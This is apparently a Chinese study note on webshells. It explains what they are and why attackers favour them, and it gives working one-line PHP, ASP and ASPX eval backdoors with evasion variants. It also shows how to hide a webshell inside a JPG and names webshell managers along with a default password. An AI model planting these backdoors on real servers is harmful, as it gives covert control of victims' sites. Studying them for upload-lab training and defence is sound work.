## Webshell
### 什么是Webshell
- Webshell就是以asp, php, jsp等网页形式存在的一种代码/命令执行环境, 也可以称为一种网页后门, 主要用用户网站管理, 服务器管理, 权限管理等操作. 使用方法简单, 只需上传一个代码文件, 通过网址访问, 便可进行很多日常操作, 极大地方便了使用者对网站和服务器的管理. 正因如此, 也有小部分人讲代码修改后当作后门程序使用, 以达到控制网站服务器的目的
- 黑客在入侵了一个网站后, 通常会将asp或php后门文件于网站服务器的web目录下的正常网页文件混在一起, 然后就可以使用浏览器来访问asp或php后门, 得到一个命令执行环境, 以达到控制网站服务器的目的

### Webshell的优点
- 最大的有点就是可以穿越防火墙, 由于与被控制的服务器或远程主机交换的数据都是**通过80端口传递**的, 因此不会被防火墙拦截
- 并且使用Webshell一般不会在系统给日志中留下记录, 只会在网站的Web日志(apache的access.log)中留下一些数据提交记录, 没有经验的管理员是很难看出入侵痕迹的

## 木马
### 一句话木马
- 又称小马, 网码, 后门, 具有代码短, 只有一行代码, 使用场景多, 可单独生成, 安全性高, 隐匿性强, 可变形免杀的特性
	- php一句话木马
		- GET型 `<?php eval($_GET['wood']); ?>` 在url传递参数
		- POST型 `<?php eval($_POST['wood']); ?>` 在post报文里传递参数
		- eval() 函数: 将后面的参数作为php代码执行
		- $\_POST[]: 参数传递的方式
		- \['cmd']: 参数的名字
	- asp一句话木马
		- `<%execute (request("value"))%)`
	- aspx一句话木马
		- `<%@ Page Language="Jscript"%>`
		- `<%eval(Request.Item["value"])%>`

#### 木马变形
当被杀软检测到木马语句时使用
- 函数替换
	- 使用其它可以执行代码的函数, 如: assert, system, passthru, exec, shell_exec
	- `<?php assert($_POST['cmd']);?>`
- 双变量绕过
	- 代码中不含有敏感函数名和参数, 都通过post指定, 中间添加&符号
	- `<?php $_POST['a']($_POST['b']);?>` 得到函数名和执行的参数
- 字符串变形绕过
- 定义字符绕过
- 回调函数绕过
- 类绕过
- 编码绕过
- 特殊字符干扰绕过
- 无字符特征码绕过

### 图片马
- 以jpg格式夹带上传木马, 有些网页限制的上传的格式
- 在代码中函数前添加@符号, 隐藏报错信息
- 制作方法
	1. 在cmd中: `copy 1.jpg/b + webshell.php/a 3.jpg` 生成名为3的
		- 其中b表示以二进制文件, a表示以ascii文件
	2. 也可以把木马写在属性-->详细信息-->版权位置
	3. 使用工具, 以16进制打开图片, 在最后的位置写入一句话木马
- 使用方法: 使用常规方式上传图片马文件, 方式与小马相同

### 大马
- 体积大, 功能全, 会调用系统的关键函数, 以代码加密的形式进行隐藏



## Webshell管理工具
### 蚁剑
- 项目地址: https://github.com/AntSwordProject/antSword
- 加载器: https://github/com/AntSwordProject/AntSword-Loader
- 使用教程: https://www.yuque.com/antswordproject/antsword/lmwppk
- 链接密码就是木马中的参数, 连接后自动连接数据库
### 冰蝎
- 需要JAVA环境
- 需要使用冰蝎自带的马, 密钥为连接密码32位md5值的前16位, 默认连接密码rebeyond
### 哥斯拉

## upload靶场